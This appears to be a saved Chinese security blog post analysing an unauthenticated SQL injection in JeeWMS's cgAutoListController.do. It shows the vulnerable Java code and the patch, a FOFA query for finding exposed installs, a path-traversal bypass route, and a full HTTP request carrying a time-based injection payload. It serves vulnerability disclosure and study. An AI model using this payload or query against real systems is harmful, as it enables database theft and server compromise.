@@ -1,0 +1,927 @@
+<article class="border rounded p-3">
+ <h1 class="pt-3 pb-4 article-title">
+  JeeWMS cgAutoListController.do SQL注入漏洞
+ </h1>
+ <div class="aio-h5 text-muted article-info">
+  <ul class="d-flex flex-wrap aio-list-split-dot">
+   <a href="https://mrxn.net/author/1">
+    Mrxn
+   </a>
+   <li>
+    发表于2025/4/25 08:28
+   </li>
+   <li>
+    1165浏览
+   </li>
+   <li>
+    <a href="#comment" target="_self">
+     0评论
+    </a>
+   </li>
+   <li>
+    <span class="text-bold">
+     30分钟
+    </span>
+    阅读
+   </li>
+   <li>
+   </li>
+  </ul>
+ </div>
+ <div style="max-width: 790px;">
+  <script async="" crossorigin="anonymous" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3202499379713676">
+  </script>
+  <ins class="adsbygoogle" data-ad-client="ca-pub-3202499379713676" data-ad-format="fluid" data-ad-layout="in-article" data-ad-slot="2223359147" style="display:block; text-align:center;">
+  </ins>
+  <script>
+   (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+ </div>
+ <hr class="my-3"/>
+ <div class="line-numbers my-3 article-content markdown">
+  <h1>
+   漏洞简介
+  </h1>
+  <p>
+   JeeWMS 是基于Java全栈技术打造的智能仓储中枢系统，具备多形态仓储场景深度适配能力（兼容3PL第三方物流与厂内物流双模式）。JeeWMS cgAutoListController.do 接口处存在
+   <a href="https://mrxn.net/tag/SQL注入">
+    SQL注入
+   </a>
+   漏洞，未经身份验证的恶意攻击者利用
+   <a href="https://mrxn.net/tag/SQL注入">
+    SQL注入
+   </a>
+   漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
+  </p>
+  <h1>
+   影响版本
+  </h1>
+  <p>
+   低于 20250422 版本
+  </p>
+  <h1>
+   fofa语法
+  </h1>
+  <blockquote>
+   <p>
+    <code>
+     body="url:userController.do?userOrgSelect&amp;userId=" &amp;&amp; "loginController.do?changeDefaultOrg"
+    </code>
+   </p>
+  </blockquote>
+  <h1>
+   漏洞分析
+  </h1>
+  <p>
+   直接看
+   <code>
+    src/main/java/org/jeecgframework/web/cgform/service/impl/autolist/CgTableServiceImpl.java
+   </code>
+   diff 修复前后差异
+  </p>
+  <p>
+   <img alt="JeeWMS cgAutoListController.do SQL注入漏洞" src="https://image.mrxn.net/32ed6f87438240ebab0c348137abfef3.webp"/>
+  </p>
+  <p>
+   可以很明显看到修复之前的是直接将
+   <code>
+    sort
+   </code>
+   与
+   <code>
+    order
+   </code>
+   两个参数直接拼接到sql语句中
+  </p>
+  <pre><code class="language-java">@Override
+    public List&lt;Map&lt;String, Object&gt;&gt; querySingle(String table, String field, Map params,
+                                                 String sort, String order, int page, int rows) {
+        StringBuilder sqlB = new StringBuilder();
+        dealQuerySql(table,field,params,sqlB);
+        if(!StringUtil.isEmpty(sort)&amp;&amp; !StringUtil.isEmpty(order)){
+            sqlB.append(" ORDER BY "+sort+" "+ order);
+        }
+        List&lt;Map&lt;String, Object&gt;&gt; result = commonService.findForJdbcParam(sqlB
+                .toString(), page, rows);
+        return result;
+    }</code></pre>
+  <p>
+   造成
+   <a href="https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E">
+    sql注入漏洞
+   </a>
+   ，而修复后的增加了
+   <code>
+    sanitizeSort
+   </code>
+   方法对传入的
+   <code>
+    sort
+   </code>
+   使用正则进行检查，如果
+   <code>
+    sort
+   </code>
+   不满足正则
+   <code>
+    [a-zA-Z0-9_]+
+   </code>
+   则直接返回
+   <code>
+    null
+   </code>
+   ，而
+   <code>
+    sanitizeOrder
+   </code>
+   方法则检查
+   <code>
+    order
+   </code>
+   只能是
+   <code>
+    ASC
+   </code>
+   或者
+   <code>
+    DESC
+   </code>
+   ，避免了SQL注入。
+  </p>
+  <p>
+   而 此方法的使用有三处地点，如下图所示
+  </p>
+  <p>
+   <img alt="JeeWMS cgAutoListController.do SQL注入漏洞" src="https://image.mrxn.net/b91b5b5d46ac4a2f9b18cacd6d7275ca.webp"/>
+  </p>
+  <p>
+   其中最后的 ExcelTempletController 不存在
+   <code>
+    sort
+   </code>
+   与
+   <code>
+    order
+   </code>
+   的调用，为固定的
+   <code>
+    null
+   </code>
+   ，只有
+   <code>
+    src/main/java/org/jeecgframework/web/cgform/controller/autolist/CgAutoListController.java
+   </code>
+   有如下调用
+  </p>
+  <pre><code class="language-java">if(isTree &amp;&amp; treeId !=null) {
+            //防止下级数据太大，最大只取500条
+            result=cgTableService.querySingle(table, field.toString(), params,sort,order, 1, 500);
+        }else {
+            result=cgTableService.querySingle(table, field.toString(), params,sort,order, p,r );
+        }</code></pre>
+  <p>
+   因此根据 JeeWMS 框架的特点，访问URL也就是：
+   <code>
+    /jeewms/cgAutoListController.do
+   </code>
+   (注意 jeewms 不一定存在)，结合前面的
+   <a href="https://mrxn.net/jswz/JeeWMS-commonController-upload-rce.html">
+    权限绕过分析文章
+   </a>
+   ，也可以是
+   <code>
+    /jeewms/rest/../cgAutoListController.do
+   </code>
+  </p>
+  <h1>
+   漏洞复现
+  </h1>
+  <pre><code class="language-http">POST /jeewms/rest/../cgAutoListController.do?datagrid&amp;configId=ba_del_mode&amp;field=id,create_name,create_by,create_date,update_name,update_by,update_date,sys_org_code,sys_company_code,del_mode_code,del_mode_name, HTTP/1.1
+Host: localhost:8081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 160
+Accept: application/json, text/javascript, /; q=0.01
+Accept-Language: zh-CN,zh;q=0.9
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://localhost:8081
+Referer: http://localhost:8081/jeewms/cgAutoListController.do?list&amp;id=ba_del_mode&amp;clickFunctionId=8a7ba3345d93bb87015d95e0118500af
+Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+X-Requested-With: XMLHttpRequest
+Accept-Encoding: gzip
+
+del_mode_code=&amp;order=desc%2C%28select%2Afrom%28select%2Bsleep%285%29union%2F%2A%2A%2Fselect%2B1%29a%29&amp;page=1&amp;rows=10&amp;searchfield=del_mode_code&amp;sort=create_date</code></pre>
+  <p>
+   <img alt="JeeWMS cgAutoListController.do SQL注入漏洞" src="https://image.mrxn.net/d40d6b91ec7a4a25a920dd519743f22b.webp"/>
+  </p>
+  <p>
+   成功延时 5 秒
+  </p>
+  <h1>
+   参考
+  </h1>
+  <ul>
+   <li>
+    <code>
+     https://gitee.com/erzhongxmu/JEEWMS/issues/IC2IV4
+    </code>
+   </li>
+  </ul>
+ </div>
+ <div class="flex-v-between">
+  <ul class="d-flex flex-wrap article-tags">
+   <li>
+    标签：
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E">
+     <span class="text-muted">
+      #
+     </span>
+     漏洞
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/web%E5%AE%89%E5%85%A8">
+     <span class="text-muted">
+      #
+     </span>
+     web安全
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5">
+     <span class="text-muted">
+      #
+     </span>
+     SQL注入
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">
+     <span class="text-muted">
+      #
+     </span>
+     代码审计
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/Java">
+     <span class="text-muted">
+      #
+     </span>
+     Java
+    </a>
+   </li>
+  </ul>
+ </div>
+ <hr class="my-3"/>
+ <script>
+  // 获取当前脚本所在的父容器
+		const parentContainer = document.currentScript.parentElement;
+		let searchContainer = parentContainer.querySelector('article') || parentContainer;
+
+		if (searchContainer) {
+			// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
+			let images = [];
+			const containers = searchContainer.querySelectorAll('.prose, .markdown');
+			containers.forEach(function(container) {
+				images = images.concat(Array.from(container.querySelectorAll('img')));
+			});
+
+			if (images.length === 0) {
+				images = searchContainer.querySelectorAll('img');
+			}
+
+			images.forEach(function(img) {
+				if (img.getAttribute('data-action') === 'zoom') {
+					const parentLink = img.parentNode;
+					if (parentLink.tagName === 'A') {
+						parentLink.setAttribute('data-fancybox', 'gallery');
+					}
+				} else {
+					const link = document.createElement('a');
+					link.setAttribute('data-fancybox', 'gallery');
+					link.setAttribute('href', img.getAttribute('src'));
+
+					img.parentNode.insertBefore(link, img);
+					link.appendChild(img);
+				}
+			});
+
+			// 初始化 Fancybox
+			Fancybox.bind("[data-fancybox]", {
+				// 您的自定义选项
+			});
+		}
+ </script>
+ <div class="x_nav_toc">
+  <div class="x_toc_header">
+   <span class="x_toc_title">
+    文章目录
+   </span>
+   <button class="x_toc_close">
+    ×
+   </button>
+  </div>
+  <div class="x_toc_content">
+   <ul class="x_anchor-list">
+   </ul>
+  </div>
+ </div>
+ <button class="x_toc_toggle">
+  <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+   <line x1="3" x2="21" y1="12" y2="12">
+   </line>
+   <line x1="3" x2="21" y1="6" y2="6">
+   </line>
+   <line x1="3" x2="21" y1="18" y2="18">
+   </line>
+  </svg>
+ </button>
+ <style type="text/css">
+  .x_nav_toc {
+    position: fixed;
+    top: 0;
+    right: -300px;
+    width: 280px;
+    height: 100%;
+    background-color: white;
+    box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
+    z-index: 1000;
+    transition: right 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    padding-top: 10px;
+}
+
+.x_nav_toc.active {
+    right: 0;
+    
+    
+}
+
+
+.x_toc_header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 20px;
+    height: 48px;
+    border-bottom: 1px solid #eee;
+}
+
+.x_toc_title {
+    font-size: 18px;
+    font-weight: bold;
+    color: #333;
+}
+
+.x_toc_close {
+    background: none;
+    border: none;
+    font-size: 24px;
+    cursor: pointer;
+    color: #777;
+    transition: color 0.2s;
+}
+
+.x_toc_close:hover {
+    color: #333;
+}
+
+.x_toc_content {
+    flex: 1;
+    overflow-y: auto;
+    padding: 15px 20px;
+    padding-right: 10px;
+}
+
+.x_anchor-list {
+    list-style-type: none;
+    padding: 0;
+    margin: 0;
+}
+
+/* 减小目录项间距 */
+.x_anchor-list li {
+    margin-bottom: 4px; /* 间距从8px减小到4px */
+}
+
+.x_anchor-list a {
+    text-decoration: none;
+    color: #555;
+    display: block;
+    padding: 6px 10px; /* 减少内边距 */
+    transition: all 0.2s;
+    font-size: 14px;
+    border-radius: 4px;
+    line-height: 1.4; /* 减小行高 */
+}
+
+.x_anchor-list a:hover,
+.x_anchor-list a:focus {
+    background-color: #f8f9fa;
+    color: #0068d6;
+}
+
+
+
+.toc-number {
+    font-weight: 600;
+    margin-right: 8px;
+    color: #495057;
+    display: inline-block;
+    min-width: 25px;
+}
+
+/* 减小各级标题间距 */
+.toc-h1 {
+    font-weight: 600;
+    font-size: 15px;
+    margin-top: 10px; /* 上边距从15px减小到10px */
+    padding-left: 5px !important;
+}
+
+.toc-h2 {
+    font-size: 14px;
+    padding-left: 15px !important; /* 缩进从20px减小到15px */
+}
+
+.toc-h3 {
+    font-size: 13px;
+    padding-left: 25px !important; /* 缩进从30px减小到25px */
+}
+
+.toc-h4 {
+    font-size: 12px;
+    padding-left: 35px !important; /* 缩进从40px减小到35px */
+}
+
+/* 修改后的切换按钮样式 - 使用图标且位置下移 */
+.x_toc_toggle {
+    position: fixed;
+    bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
+    border-radius: 50%;
+    border: none;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    z-index: 999;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0;
+    
+}
+
+.x_toc_toggle svg {
+   width:24px;height:24px;stroke:#3d9bff;
+}
+
+.x_toc_toggle:hover {
+    #background-color: #0081f8;
+    transform: translateY(-3px);
+    box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+}
+
+@media (max-width: 768px) {
+    .x_nav_toc {
+        width: 280px;
+    }
+    .x_toc_toggle {
+        bottom: 100px; /* 手机端也下移位置 */
+        right: 30px;
+        width: 40px;
+        height: 40px;
+    }
+    .x_toc_toggle svg {
+        width: 20px;
+        height: 20px;
+    }
+}
+ </style>
+ <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // 获取所有标题元素
+    var className = ".line-numbers"; 
+    var selectors = [];
+    for (var i = 1; i <= 6; i++) {
+        selectors.push(className + ' h' + i);
+    }
+    var headings = document.querySelectorAll(selectors.join(', '));
+    
+    // 获取DOM元素
+    var tocContainer = document.querySelector('.x_nav_toc');
+    var toggleButton = document.querySelector('.x_toc_toggle');
+    var tocList = document.querySelector('.x_anchor-list');
+    var closeButton = document.querySelector('.x_toc_close');
+    var currentHighlight = null;
+    
+                
+    // 检测是否为移动设备
+      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    // 如果没有标题，隐藏所有元素
+    if (headings.length === 0) {
+        tocContainer.style.display = 'none';
+        toggleButton.style.display = 'none';
+        return;
+    }
+    
+    // 初始化层级计数器
+    var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
+    var currentLevel = 0;
+    
+    // 生成带数字编号的目录
+    headings.forEach(function(heading, index) {
+        var level = parseInt(heading.tagName[1]);
+        
+        // 更新计数器
+        counters[level - 1] += 1; // 增加当前级别计数器
+        
+        // 重置更低级计数器
+        for (var i = level; i < 6; i++) {
+            counters[i] = 0;
+        }
+        
+        // 生成编号字符串（如"1.2.3"）
+        var numberParts = [];
+        for (var i = 0; i < level; i++) {
+            if (counters[i] > 0) {
+                numberParts.push(counters[i]);
+            }
+        }
+        var numberText = numberParts.join('.')+'.';
+        
+        // 创建唯一ID
+        var id = 'toc-' + numberText.replace(/\./g, '-');
+        heading.id = id;
+        
+        var listItem = document.createElement('li');
+        var anchor = document.createElement('a');
+        var numberSpan = document.createElement('span');
+        
+        numberSpan.className = 'toc-number';
+        numberSpan.textContent = numberText;
+        anchor.appendChild(numberSpan);
+        anchor.innerHTML += heading.textContent;
+        anchor.href = '#' + id;
+        anchor.classList.add('toc-h' + level);
+        
+        listItem.appendChild(anchor);
+        tocList.appendChild(listItem);
+        
+        // 添加点击事件（不关闭目录）
+        anchor.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            
+           
+            // 更新高亮状态
+            if (currentHighlight) {
+                currentHighlight.classList.remove('active');
+            }
+            this.classList.add('active');
+            currentHighlight = this;
+            
+            // 滚动到对应位置
+            var targetId = this.getAttribute('href').substring(1);
+            var targetElement = document.getElementById(targetId);
+            if (targetElement) {
+                var header = document.querySelector("header");
+                var headerHeight = header ? header.offsetHeight : 0;
+                var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
+                var offsetPosition = elementPosition - headerHeight - 20;
+                
+                window.scrollTo({
+                    top: offsetPosition,
+                    behavior: 'smooth'
+                });
+                
+                // 滚动到目录项的可视区域
+                this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
+    
+
+          // 点击事件中
+          if (isMobile) {
+           closeToc(); // 移动端点击后关闭目录
+          }
+            
+                
+            }
+        });
+    });
+    
+    // 切换按钮点击事件
+    toggleButton.addEventListener('click', function() {
+        tocContainer.classList.add('active');
+     
+    });
+    
+    // 关闭按钮点击事件
+    closeButton.addEventListener('click', function(e) {
+        e.stopPropagation();
+        closeToc();
+    });
+    
+  
+    
+    // 滚动时更新高亮状态
+    window.addEventListener('scroll', function() {
+    
+    var fromTop = window.scrollY;
+    var header = document.querySelector("header");
+    var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
+    
+    
+     //console.log(headerHeight);
+    
+    
+    
+    // 精准计算标题文档位置
+    var activeSection = null;
+    headings.forEach(function(heading) {
+        var section = document.getElementById(heading.id);
+        if (!section) return;
+        
+        // 使用getBoundingClientRect获取精确位置
+        var rect = section.getBoundingClientRect();
+        var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
+        var sectionBottom = rect.bottom + fromTop + headerHeight;
+        
+        // 增加20px激活区域缓冲
+        if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
+            activeSection = heading;
+        }
+    });
+
+
+ 
+
+    // 更新高亮状态（新增精确边界判断）
+    if (activeSection) {
+        var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
+
+        if (tocLink && currentHighlight !== tocLink) {
+            if (currentHighlight) {
+            currentHighlight.blur();
+            currentHighlight.classList.remove('active');
+            }
+            
+            
+            tocLink.classList.add('active');
+           tocLink.focus();
+            currentHighlight = tocLink;
+            
+            // 平滑滚动到可视区域（改进触发条件）
+            var tocRect = tocLink.getBoundingClientRect();
+            var tocContainerRect = tocContainer.getBoundingClientRect();
+            if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
+                tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
+            }
+        }
+    }
+});
+    
+    // 关闭目录面板
+    function closeToc() {
+        tocContainer.classList.remove('active');
+      
+    }
+});
+ </script>
+ <style>
+  /* 超小屏幕隐藏 */
+    @media (max-width: 768px) {
+        #qrcode-right {
+            display: none;
+        }
+    }
+ </style>
+ <div class="copyright-plugin" style="padding:10px; font-size:14px; display:flex; justify-content: space-between; align-items: center;">
+  <div>
+   版权所有：
+   <a href="https://mrxn.net/">
+    Mrxn's Blog
+   </a>
+   <br/>
+   文章标题：
+   <a href="https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html">
+    JeeWMS cgAutoListController.do SQL注入漏洞
+   </a>
+   <br/>
+   文章链接：
+   <a href="https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html">
+    https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html
+   </a>
+   <br/>
+   本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。
+  </div>
+  <!-- 右侧二维码 -->
+  <div id="qrcode-right">
+   <div id="copyright-qrcode">
+   </div>
+   <div style="text-align: center;font-size:12px;">
+    设备上扫码阅读
+   </div>
+  </div>
+  <script src="https://mrxn.net/content/plugins/log_posts/assets/qrcode.min.js">
+  </script>
+  <script>
+   var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
+        text: encodeURI("https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html"),
+        width: 100,
+        height: 100,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+  </script>
+ </div>
+ <div class="posts_related">
+  <h3>
+   📚 推荐阅读
+  </h3>
+  <ul>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html">
+     深信服运维安全管理系统 install_patch 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html">
+     深信服运维安全管理系统 del_patch 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html">
+     深信服运维安全管理系统 upload_file 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html">
+     深信服运维安全管理系统 csspost/update 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html">
+     深信服运维安全管理系统 save_SNMP 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html">
+     深信服运维安全管理系统 getLdap 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html">
+     深信服运维安全管理系统 Jwt 密钥硬编码
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html">
+     深信服运维安全管理系统 del_route 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html">
+     深信服运维安全管理系统 del_net 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html">
+     深信服运维安全管理系统 change_net 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html">
+     九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html">
+     九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/qinglong-auth-bypass-rce.html">
+     青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html">
+     九佳易管理系统 picHY.ashx SQL 注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-install-config-rce.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html">
+     东胜物流软件 MsChDuiController 多个SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-Public-download.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html">
+     东胜物流软件 MsAnnounceController SQL注入漏洞
+    </a>
+   </li>
+  </ul>
+ </div>
+ <style>
+  /* 底部展示样式 */
+        .qrcode-bottom-box {
+            margin: 40px auto;
+            text-align: center;
+        }
+        .qrcode-title {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 0px;
+            font-weight: bold;
+            text-align: center;
+        }
+        .qrcode-bottom-box img {
+            display: inline-block;
+            padding: 10px;
+            background: #fff;
+            border-radius: 8px;
+            margin: 10px auto;
+        }
+
+/* 悬浮展示样式 */
+
+.qrcode-float {
+    position: fixed;
+    z-index: 9999;
+    background: rgba(255,255,255,0.98);
+    padding: 20px;
+    border-radius: 12px;
+    
+   
+}
+.qrcode-float:hover {
+           transform: scale(1.05);
+    }
+
+
+      
+   
+   /* 移动端适配 */
+    @media (max-width: 1440px) {
+        .qrcode-float {
+            right: 2%;
+            transform: none;
+        }
+    }
+    
+    /* 超小屏幕隐藏 */
+    @media (max-width: 768px) {
+        .qrcode-float {
+            display: none;
+        }
+    }
+ </style>
+ <div class="qrcode-float">
+  <div id="posts-qrcode">
+  </div>
+  <div class="qrcode-title" style="font-size: 12px;">
+   手机扫码阅读
+  </div>
+ </div>
+ <script src="https://mrxn.net/content/plugins/log_posts/assets/qrcode.min.js">
+ </script>
+ <script>
+  var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
+        text: encodeURI("https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html"),
+        width: 100,
+        height: 100,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+ </script>
+</article>
